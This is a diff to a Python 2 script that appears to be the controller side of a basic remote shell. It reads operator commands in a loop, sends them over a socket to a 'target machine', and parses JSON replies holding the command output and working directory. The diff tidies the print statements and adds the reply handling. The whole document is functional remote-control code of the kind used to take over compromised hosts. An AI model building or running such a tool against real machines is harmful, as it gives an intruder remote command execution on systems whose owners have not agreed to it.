@@ -3,7 +3,7 @@
 
 import socket
 import sys
-
+import json
 #------------------------------------------------------------------------------
 
 # Setup socket (allows computers to connect)
@@ -34,25 +34,42 @@ def socketSetup():
 
 #------------------------------------------------------------------------------
 
+# Send terminal commands to target machine
 def sendCommands(conn):
-	print "will get current directory now"
 	currentClientPath = conn.recv(1024)
-	print "currentClientPath is: {}".format(currentClientPath)
+	print "Current client path is: {}".format(currentClientPath)
 	
 	# Will send commands from this point on.
 	print "Enter commands from now on: "
 	while True:
 		print currentClientPath + ":",
 		cmd = raw_input()
-		print "cmd entered in is: {}".format(cmd)
+		
+		# Handle case user wants to quit		
 		if cmd == 'quit':
 			print "Quitting connection ..."
 			conn.close()
 			s.close()
 			sys.exit()
 
-		if len(cmd) > 0: #only send if actually data there
-			conn.send(cmd)
+		if len(cmd) > 0: # Only send if actually data there
+			conn.send(cmd)	# Send command
+
+			clientReply = conn.recv(1024) # Get reply for command
+			clientReply = json.loads(clientReply) # Reply loaded into dict
+			print "clientReply after loads is: {}".format(clientReply)
+			
+			# Check if there was an exception
+			if clientReply["exception"] == "":	# No exception so update path, print output
+				currentClientPath = clientReply["currentDir"]	# Update path if changed 
+			
+				# Print output of command also. E.g python --version
+				if clientReply["commandOutput"] != "":
+					print "Output of command is: {}".format(clientReply["commandOutput"])
+
+			else: # Exception received, so just print it				
+				print clientReply["exception"]
+
 		else:
 			print "No command entered."
 
